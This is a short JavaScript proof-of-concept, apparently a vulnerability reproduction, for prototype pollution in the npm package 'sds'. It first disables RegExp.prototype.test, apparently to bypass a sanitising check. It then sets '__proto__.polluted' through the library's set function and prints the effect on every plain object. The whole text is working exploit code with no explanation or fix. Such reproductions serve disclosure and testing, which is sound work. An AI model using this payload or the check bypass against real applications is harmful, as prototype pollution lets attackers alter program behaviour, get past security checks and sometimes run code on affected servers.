RegExp.prototype.test = () => false;
const root = require('sds');
obj = {};
let payload = '__proto__.polluted';
console.log({}.polluted);
root.set({}, payload, true);
console.log({}.polluted);